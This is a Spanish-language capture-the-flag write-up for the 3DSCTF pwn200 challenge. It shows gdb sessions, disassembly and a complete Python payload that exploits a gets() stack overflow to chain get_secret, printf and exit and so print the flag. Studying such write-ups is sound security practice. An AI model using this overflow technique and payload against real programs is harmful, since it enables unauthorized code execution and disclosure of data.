Solución al pwn200 de 3DSCTF:

- Con el strings ves que hay un flag.txt  y una variable fl4g
- Creamos el fichero flag.txt con el texto que queramos
- Peta con un offset de 45
- Paso a paso en el gdb
- Pones un breakpoint en el main *0x08048a00, después de llamar a la función gets

>  0x0804884f   33 entry0       |   sym.main ();
 * 0x080489e0   33 sym.main     |           ; var int local_fh @ esp+0xf
   0x0804f0a0   30 sym.__printf |           ; DATA XREF from 0x08048866 (entry0)
   0x0807f280 1043 sym._IO_vfprintf_internal0x080489e0      sub esp, 0x3c         
   0x0804f8d0  295 sym.gets     |           0x080489e3      mov dword [esp], str.b
   0x080482a0  172 sym.backtrace_and_maps   0x080489ea      call sym.__printf     
   0x0806fe80  188 sym.backtrace|           0x080489ef      lea eax, dword [esp + 
   0x0806ff50  620 sym.__backtrace_symbols_fdx080489f3      mov dword [esp], eax
   0x08056310   80 sym.malloc_init_state    0x080489f6      call sym.gets         
   0x08056360  132 sym.mem2mem_check        0x080489fb      xor eax, eax
   0x080563f0  473 sym.mem2chunk_check      0x080489fd      add esp, 0x3c         
   0x080565f0   97 sym.__malloc_assert      0x08048a00      ret
   
- Introducir el offset ('A'*45) 

python -c "print 'A'*45"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   
- Apuntas a la funcion get_secret en $esp

set {int}0xbffff34c = 0x080489a0 (siendo 0xbffff34c el valor de $esp, cambiar si no coincide)


- Pones un breakpoint en *0x080489de

disas get_secret
Dump of assembler code for function get_secret:
   0x080489a0 <+0>:	push   esi
   0x080489a1 <+1>:	sub    esp,0x18
   0x080489a4 <+4>:	mov    DWORD PTR [esp+0x4],0x80cf91b
   0x080489ac <+12>:	mov    DWORD PTR [esp],0x80bc2a8
   0x080489b3 <+19>:	call   0x804f710 <fopen>
   0x080489b8 <+24>:	mov    esi,eax
   0x080489ba <+26>:	mov    DWORD PTR [esp+0x8],esi
   0x080489be <+30>:	mov    DWORD PTR [esp+0x4],0x2d
   0x080489c6 <+38>:	mov    DWORD PTR [esp],0x80eca2d
   0x080489cd <+45>:	call   0x804f4c0 <fgets>
   0x080489d2 <+50>:	mov    DWORD PTR [esp],esi
   0x080489d5 <+53>:	call   0x804f190 <fclose>
   0x080489da <+58>:	add    esp,0x18
   0x080489dd <+61>:	pop    esi
   0x080489de <+62>:	ret    
End of assembler dump.

- Llamas al printf y pasas la dirección de fl4g 

0x80eca2d <fl4g>:	0x65757250	0x000a6162	0x00000000	0x00000000

	set {int}0xbffff350 = 0x0804f0a0 --> Llamada a printf
	set {int}0xbffff354 = 0x0804e660 --> Aquí podría ponerse la llamada a la función exit para que sea más elegante (0x0804e660)
	set {int}0xbffff358 = 0x080eca2d --> Dirección de fl4g
	
disas printf
Dump of assembler code for function printf:
   0x0804f0a0 <+0>:	sub    esp,0xc
   0x0804f0a3 <+3>:	lea    eax,[esp+0x14]
   0x0804f0a7 <+7>:	sub    esp,0x4
   0x0804f0aa <+10>:	push   eax
   0x0804f0ab <+11>:	push   DWORD PTR [esp+0x18] --> Aquí es donde coge el valor de la variable fl4g
   0x0804f0af <+15>:	push   DWORD PTR ds:0x80eb4b8
   0x0804f0b5 <+21>:	call   0x807f280 <vfprintf>
   0x0804f0ba <+26>:	add    esp,0x1c
   0x0804f0bd <+29>:	ret    
End of assembler dump.
	
	
- Python final para explotar

El payload quedaría así gráficamente:

|45*A		|
|get_secret	|
|printf		|
|exit		|
|addr_fl4g	|
-------------


Se prueba con
python pwn_not_the_same.py > file.txt
./not_the_same < file.txt


#!/usr/bin/env python
# Archivo pwn_not_the_same.py

buf='A'*45
# get_secret
retn1 = "\xa0\x89\x04\x08"
# printf
retn2 = "\xa0\xf0\x04\x08"
# exit
retn3 = "\x60\xe6\x04\x08"
# fl4g posicion
retn4 = "\x2d\xca\x0e\x08"

print buf+retn1+retn2+retn3+retn4

# Fin fichero pwn_not_the_same






- Notas varias


      Num     Type           Disp Enb Address    What
2       breakpoint     keep y   0x08048a00 <main+32>
	breakpoint already hit 1 time
3       breakpoint     keep y   0x080489de <get_secret+62>
   
   
   set {int}0xbffff34c = 0x080489a0
   
   
   
x/32xw $esp-16
0xbffff340:	0x41414141	0x41414141	0x41414141	0x080eb00c
0xbffff350:	0x0804f0a0	0x080eca2d	0x080eca2d	0xbffff374
0xbffff360:	0x00000000	0x00000001	0xbffff404	0x080489e0
0xbffff370:	0x00000000	0x0804818c	0x080eb00c	0x49656e69




   

